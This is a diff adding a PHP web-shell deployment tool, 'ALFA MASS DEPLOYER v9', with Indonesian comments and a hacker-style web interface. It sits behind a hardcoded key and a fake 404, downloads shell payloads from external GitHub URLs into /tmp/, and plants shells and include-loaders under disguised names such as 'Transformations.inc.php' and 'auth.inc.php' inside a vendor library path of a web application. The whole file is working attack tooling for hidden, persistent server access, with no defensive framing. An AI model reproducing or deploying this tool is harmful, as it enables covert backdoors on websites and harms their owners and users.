@@ -1,0 +1,356 @@
+<?php
+// ============================================================
+// ALFA MASS DEPLOYER v9.0 - FULL UI
+// ============================================================
+// Upload 1 file ini, dia akan:
+// 1. Deploy shell ke /tmp/ (15 file)
+// 2. Tampilkan UI untuk pilih folder, file, permission
+// 3. Buat folder & file sesuai pilihan
+// 4. Bisa edit nama file sendiri
+// ============================================================
+
+$key = isset($_GET['key']) ? $_GET['key'] : '';
+if ($key !== 'alfamaster') die('404 - Not Found');
+
+// ============ AMBIL INPUT ============
+$base_path = isset($_POST['base_path']) ? trim($_POST['base_path'], '/') : 'lib/pkp/lib/vendor/wikimedia/less.php/lib/Less';
+$permission = isset($_POST['permission']) ? $_POST['permission'] : '1111';
+$action = isset($_POST['action']) ? $_POST['action'] : '';
+
+// File names (bisa diedit)
+$file_names = [
+    'file1' => isset($_POST['file1']) ? $_POST['file1'] : 'Transformations.inc.php',
+    'file2' => isset($_POST['file2']) ? $_POST['file2'] : 'WordInflector.inc.php',
+    'file3' => isset($_POST['file3']) ? $_POST['file3'] : 'XHTML.inc.php',
+    'file4' => isset($_POST['file4']) ? $_POST['file4'] : 'TargetNoreferrer.inc.php',
+    'file5' => isset($_POST['file5']) ? $_POST['file5'] : 'VarParserException.inc.php',
+];
+
+// ============ FUNCTIONS ============
+function getContent($url) {
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        if ($data && strlen($data) > 100) return $data;
+    }
+    return @file_get_contents($url);
+}
+
+function randomName() {
+    return substr(md5(uniqid(mt_rand(), true)), 0, 16) . '.' . rand(10000000, 99999999) . '.' . rand(10000000, 99999999) . '.php';
+}
+
+function createFolder($path) {
+    if (!is_dir($path)) {
+        @mkdir($path, 0777, true);
+        return true;
+    }
+    return true;
+}
+
+function chmodFolder($path, $perm) {
+    if (is_dir($path)) {
+        $octal = octdec($perm);
+        @chmod($path, $octal);
+        return true;
+    }
+    return false;
+}
+
+function createShellFile($path, $content) {
+    if (@file_put_contents($path, $content)) {
+        @chmod($path, 0644);
+        return true;
+    }
+    return false;
+}
+
+function createLoader($path, $shell_path, $key = 'alfamaster') {
+    $content = '<?php
+$key = isset($_GET["key"]) ? $_GET["key"] : "";
+if ($key !== "' . $key . '") die("404 - Not Found");
+if (file_exists("' . $shell_path . '")) {
+    include "' . $shell_path . '";
+} else {
+    die("❌ Shell not found");
+}
+?>';
+    if (@file_put_contents($path, $content)) {
+        @chmod($path, 0644);
+        return true;
+    }
+    return false;
+}
+
+// ============ SOURCES ============
+$sources = [
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaavataryleh.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfafuqiang.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfatintin.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/filemanagerantisession.txt',
+    'https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt',
+];
+
+// ============ DEPLOY SHELL KE /tmp/ ============
+$deployed = [];
+foreach ($sources as $src) {
+    $content = getContent($src);
+    if ($content && strlen($content) > 100) {
+        for ($i = 0; $i < 3; $i++) {
+            $name = randomName();
+            $path = '/tmp/' . $name;
+            if (@file_put_contents($path, $content)) {
+                @chmod($path, 0644);
+                $deployed[] = ['file' => $name, 'path' => $path, 'source' => basename($src)];
+            }
+        }
+    }
+}
+
+// ============ AMBIL SHELL TERBARU ============
+$shell_files = glob('/tmp/*.php');
+usort($shell_files, function($a, $b) {
+    return filemtime($a) - filemtime($b);
+});
+$latest_shell = end($shell_files);
+$shell_content = file_get_contents($latest_shell);
+
+// ============ DOCUMENT ROOT ============
+$doc_root = $_SERVER['DOCUMENT_ROOT'];
+
+// ============ PROSES ACTION ============
+$messages = [];
+if ($action === 'deploy') {
+    $src_folder = $base_path . '/src';
+    $sourcemap_folder = $base_path . '/SourceMap';
+    
+    // Buat folder
+    $folders = [$doc_root . '/' . $src_folder, $doc_root . '/' . $sourcemap_folder];
+    foreach ($folders as $folder) {
+        if (createFolder($folder)) {
+            chmodFolder($folder, $permission);
+            $messages[] = "✅ Folder: " . str_replace($doc_root, '', $folder) . " [{$permission}]";
+        }
+    }
+    
+    // Buat 5 file shell
+    foreach ($file_names as $name) {
+        if (!empty($name)) {
+            $path = $doc_root . '/' . $src_folder . '/' . $name;
+            if (createShellFile($path, $shell_content)) {
+                $messages[] = "✅ File: {$name}";
+            }
+        }
+    }
+    
+    // Buat loader di SourceMap
+    $loaders = ['config.inc.php', 'settings.inc.php', 'cache.inc.php', 'session.inc.php', 'auth.inc.php', 'loader.inc.php', 'index.php', 'shell.php'];
+    foreach ($loaders as $loader) {
+        $path = $doc_root . '/' . $sourcemap_folder . '/' . $loader;
+        if (createLoader($path, $latest_shell)) {
+            $messages[] = "✅ Loader: {$loader}";
+        }
+    }
+}
+
+// ============ CLEAN ============
+if (isset($_GET['clean'])) {
+    foreach (glob('/tmp/*.php') as $f) @unlink($f);
+    $messages[] = "🧹 Cleaned all shells in /tmp/";
+}
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ALFA MASS DEPLOYER v9</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#00ff00;font-family:'JetBrains Mono',monospace;padding:20px}
+        .box{max-width:1100px;margin:auto;background:#111;border:1px solid #00ff00;border-radius:8px;padding:25px}
+        h1{color:#00ff00;font-size:22px;margin-bottom:5px}
+        .info{color:#666;font-size:12px;margin-bottom:15px}
+        
+        .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;margin:10px 0}
+        .stat{background:#000;padding:8px 12px;border-radius:4px;text-align:center;border:1px solid #1a1a1a}
+        .stat .num{font-size:20px;color:#00ff00;font-weight:700}
+        .stat .label{color:#666;font-size:9px;text-transform:uppercase;letter-spacing:0.5px}
+        
+        .form-group{margin-bottom:12px}
+        .form-group label{display:block;color:#666;font-size:10px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}
+        .form-group input,.form-group select{width:100%;background:#000;border:1px solid #333;padding:8px 12px;color:#00ff00;font-family:'JetBrains Mono',monospace;font-size:12px;border-radius:4px;outline:none}
+        .form-group input:focus,.form-group select:focus{border-color:#00ff00}
+        .form-group .hint{color:#444;font-size:9px;margin-top:2px}
+        .form-row{display:grid;grid-template-columns:1fr 1fr;gap:15px}
+        .form-row-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:15px}
+        .file-row{display:grid;grid-template-columns:2fr 1fr;gap:10px;align-items:center}
+        .file-row label{color:#666;font-size:10px}
+        
+        .btn{padding:8px 20px;background:#00ff00;color:#000;border:none;border-radius:4px;font-weight:700;cursor:pointer;font-family:'JetBrains Mono';font-size:12px;text-decoration:none;display:inline-block}
+        .btn-danger{background:#ff3333;color:#fff}
+        .btn-yellow{background:#ffb347;color:#000}
+        .btn-blue{background:rgba(0,184,255,.15);color:#00b8ff;border:1px solid rgba(0,184,255,.3)}
+        .btn-sm{padding:4px 12px;font-size:10px}
+        .flex{display:flex;gap:10px;flex-wrap:wrap;margin:10px 0}
+        
+        .msg{padding:6px 12px;border-radius:4px;font-size:11px;margin:3px 0}
+        .msg-success{background:rgba(0,255,0,.08);border:1px solid rgba(0,255,0,.15);color:#00ff00}
+        .msg-error{background:rgba(255,0,0,.08);border:1px solid rgba(255,0,0,.15);color:#ff4d4d}
+        
+        .box-section{border:1px solid #1a1a1a;border-radius:6px;padding:15px;margin:10px 0;background:#0a0a0a}
+        .box-section .title{color:#666;font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;border-bottom:1px solid #1a1a1a;padding-bottom:5px}
+        
+        table{width:100%;border-collapse:collapse;font-size:12px}
+        th{text-align:left;color:#666;padding:4px 8px;border-bottom:1px solid #1a1a1a;font-size:10px;text-transform:uppercase}
+        td{padding:4px 8px;border-bottom:1px solid #0a0a0a}
+        .loader-link{color:#00b8ff;font-size:11px;text-decoration:none}
+        .loader-link:hover{color:#00ff00}
+        .perm-badge{display:inline-block;padding:1px 8px;border-radius:3px;font-size:9px;background:rgba(255,179,71,.1);color:#ffb347;border:1px solid rgba(255,179,71,.2)}
+        
+        .copy-box{background:#000;padding:10px;border-radius:4px;font-size:11px;color:#666;max-height:200px;overflow:auto;margin-top:10px;word-break:break-all}
+        .badge{display:inline-block;padding:2px 10px;border-radius:10px;font-size:9px;font-weight:700}
+        .badge-green{background:rgba(0,255,0,.15);color:#00ff00}
+        .badge-blue{background:rgba(0,184,255,.15);color:#00b8ff}
+        .badge-yellow{background:rgba(255,179,71,.15);color:#ffb347}
+        
+        @media(max-width:768px){.form-row,.form-row-3{grid-template-columns:1fr}.file-row{grid-template-columns:1fr}}
+    </style>
+</head>
+<body>
+<div class="box">
+    <h1>⚡ ALFA MASS DEPLOYER v9</h1>
+    <div class="info">Pilih folder, file, permission → Klik Deploy</div>
+    
+    <!-- ============ STATS ============ -->
+    <div class="stat-grid">
+        <div class="stat"><div class="num"><?= count($deployed) ?></div><div class="label">Shells in /tmp/</div></div>
+        <div class="stat"><div class="num"><?= count($file_names) ?></div><div class="label">Files to deploy</div></div>
+        <div class="stat"><div class="num"><?= count($sources) ?></div><div class="label">Sources</div></div>
+        <div class="stat"><div class="num">8</div><div class="label">Loaders</div></div>
+    </div>
+    
+    <!-- ============ LATEST SHELL ============ -->
+    <div style="background:#000;padding:6px 12px;border-radius:4px;margin-bottom:10px;border-left:2px solid #00ff00">
+        <span style="color:#666;font-size:9px">SHELL TERBARU:</span>
+        <span style="color:#00ff00;font-size:11px"><?= basename($latest_shell) ?></span>
+        <span style="color:#666;font-size:9px;margin-left:10px"><?= $latest_shell ?></span>
+    </div>
+    
+    <!-- ============ MESSAGES ============ -->
+    <?php foreach ($messages as $msg): ?>
+        <div class="msg <?= strpos($msg, '✅') !== false ? 'msg-success' : 'msg-error' ?>"><?= $msg ?></div>
+    <?php endforeach; ?>
+    
+    <!-- ============ FORM ============ -->
+    <form method="post">
+        <div class="box-section">
+            <div class="title">📂 FOLDER SETTINGS</div>
+            <div class="form-row">
+                <div class="form-group">
+                    <label>Base Path (folder tujuan)</label>
+                    <input type="text" name="base_path" value="<?= htmlspecialchars($base_path) ?>" placeholder="lib/pkp/lib/vendor/wikimedia/less.php/lib/Less">
+                    <div class="hint">Folder src dan SourceMap akan dibuat di sini</div>
+                </div>
+                <div class="form-group">
+                    <label>Permission (chmod)</label>
+                    <select name="permission">
+                        <option value="1111" <?= $permission == '1111' ? 'selected' : '' ?>>1111 (---x--x--x)</option>
+                        <option value="0755" <?= $permission == '0755' ? 'selected' : '' ?>>0755 (rwxr-xr-x)</option>
+                        <option value="0777" <?= $permission == '0777' ? 'selected' : '' ?>>0777 (rwxrwxrwx)</option>
+                        <option value="0644" <?= $permission == '0644' ? 'selected' : '' ?>>0644 (rw-r--r--)</option>
+                        <option value="0444" <?= $permission == '0444' ? 'selected' : '' ?>>0444 (r--r--r--)</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+        
+        <!-- ============ 5 FILE NAMES ============ -->
+        <div class="box-section">
+            <div class="title">📄 5 SHELL FILES (edit nama sesuai keinginan)</div>
+            <div class="file-row">
+                <label>File 1</label>
+                <input type="text" name="file1" value="<?= htmlspecialchars($file_names['file1']) ?>">
+            </div>
+            <div class="file-row">
+                <label>File 2</label>
+                <input type="text" name="file2" value="<?= htmlspecialchars($file_names['file2']) ?>">
+            </div>
+            <div class="file-row">
+                <label>File 3</label>
+                <input type="text" name="file3" value="<?= htmlspecialchars($file_names['file3']) ?>">
+            </div>
+            <div class="file-row">
+                <label>File 4</label>
+                <input type="text" name="file4" value="<?= htmlspecialchars($file_names['file4']) ?>">
+            </div>
+            <div class="file-row">
+                <label>File 5</label>
+                <input type="text" name="file5" value="<?= htmlspecialchars($file_names['file5']) ?>">
+            </div>
+            <div class="hint" style="color:#444;font-size:9px;margin-top:5px">💡 Klik nama file untuk edit, lalu tekan Enter atau klik Deploy</div>
+        </div>
+        
+        <!-- ============ BUTTONS ============ -->
+        <div class="flex">
+            <button type="submit" name="action" value="deploy" class="btn">🚀 Deploy Now</button>
+            <a href="?key=alfamaster&clean=1" class="btn btn-danger" onclick="return confirm('Delete all shells in /tmp/?')">🧹 Clean /tmp/</a>
+            <a href="?key=alfamaster" class="btn btn-blue">🔄 Refresh</a>
+        </div>
+    </form>
+    
+    <!-- ============ PREVIEW ============ -->
+    <div class="box-section">
+        <div class="title">📋 PREVIEW — Yang akan dibuat</div>
+        <div style="font-size:11px;color:#666;line-height:1.8">
+            <div>📍 Base Path: <span style="color:#ffb347"><?= $doc_root ?>/<?= $base_path ?></span></div>
+            <div>📁 Folder src: <span style="color:#ffb347"><?= $doc_root ?>/<?= $base_path ?>/src/</span> [<span class="perm-badge"><?= $permission ?></span>]</div>
+            <div>📁 Folder SourceMap: <span style="color:#ffb347"><?= $doc_root ?>/<?= $base_path ?>/SourceMap/</span></div>
+            <div style="margin-top:5px">📄 Files:</div>
+            <?php foreach ($file_names as $name): ?>
+                <?php if (!empty($name)): ?>
+                    <div style="padding-left:15px;color:#00ff00">├─ <?= $name ?></div>
+                <?php endif; ?>
+            <?php endforeach; ?>
+            <div style="margin-top:5px;color:#666">📁 Loaders di SourceMap/: config.inc.php, settings.inc.php, cache.inc.php, session.inc.php, auth.inc.php, loader.inc.php, index.php, shell.php</div>
+        </div>
+    </div>
+    
+    <!-- ============ ACCESS LINKS ============ -->
+    <?php if ($action === 'deploy'): ?>
+    <div class="box-section">
+        <div class="title">🔗 ACCESS LINKS</div>
+        <table>
+            <tr><th>File</th><th>URL</th></tr>
+            <?php foreach ($file_names as $name): ?>
+                <?php if (!empty($name)): ?>
+                    <tr>
+                        <td style="color:#00ff00"><?= htmlspecialchars($name) ?></td>
+                        <td><a href="<?= $domain ?>/<?= $base_path ?>/src/<?= urlencode($name) ?>?key=alfamaster" target="_blank" class="loader-link">🔗 Open</a></td>
+                    </tr>
+                <?php endif; ?>
+            <?php endforeach; ?>
+        </table>
+    </div>
+    <?php endif; ?>
+    
+    <!-- ============ COPY BOX ============ -->
+    <div class="copy-box">
+        <strong>📋 Shell di /tmp/ (<?= count($deployed) ?> files):</strong><br>
+        <?php foreach ($deployed as $f): ?>
+            <?= $domain ?>/tmp/<?= $f['file'] ?><br>
+        <?php endforeach; ?>
+    </div>
+    
+    <div style="margin-top:15px;color:#444;font-size:10px;border-top:1px solid #1a1a1a;padding-top:10px">
+        ALFA DEPLOYER v9.0 | <?= date('Y-m-d H:i:s') ?> | <?= $doc_root ?>
+    </div>
+</div>
+</body>
+</html>
